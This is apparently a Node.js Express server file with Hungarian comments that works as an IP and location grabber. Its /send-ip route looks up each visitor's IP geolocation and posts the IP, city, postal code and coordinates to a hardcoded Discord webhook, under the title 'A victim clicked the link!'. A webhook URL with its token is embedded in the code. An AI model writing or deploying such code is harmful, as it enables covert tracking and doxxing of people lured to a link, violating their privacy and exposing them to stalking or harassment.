const webhookUrl = 'https://discord.com/api/webhooks/1163410175395373107/Tc5X6Ndt2R6qwVVbh5kVYgBSByLdEAC_mOQa9C7VbMjXxkgLUukRQVOFumbDRs5d1A9u';  // Cseréld ki a saját webhook URL-edre

// IP cím és hely információ küldése a Discordra
app.get('/send-ip', (req, res) => {
    const userIp = req.ip || req.connection.remoteAddress;

    fetch(`https://ipapi.co/${userIp}/json/`)
        .then(geoResponse => geoResponse.json())
        .then(geoData => {
            const message = {
                username: "Helyszíni Naplózó <3",
                avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
                content: `<@1095731086513930260>`,
                embeds: [
                    {
                        title: 'Egy áldozat rákattintott a linkre!',
                        description: `**IP-cím >> **${userIp}\n**Hálózat >> ** ${geoData.network}\n**Város >> ** ${geoData.city}\n**Régió >> ** ${geoData.region}\n**Ország >> ** ${geoData.country_name}\n**Irányítószám >> ** ${geoData.postal}\n**Szélesség >> ** ${geoData.latitude}\n**Hosszúság >> ** ${geoData.longitude}`,
                        color: 0x800080
                    }
                ]
            };

            // Küldés Discordra
            axios.post(webhookUrl, message)
                .then(response => {
                    res.send('IP-cím és helyadatok sikeresen elküldve Discordra!');
                })
                .catch(error => {
                    res.send('Hiba történt a Discord webhook küldésekor.');
                });
        })
        .catch(error => {
            res.send('Hiba történt az IP cím lekérdezésekor!');
        });
});


// Alapértelmezett route, amely a gyökér URL-ről a 'index.html'-t szolgáltatja ki
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Szerver indítása
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
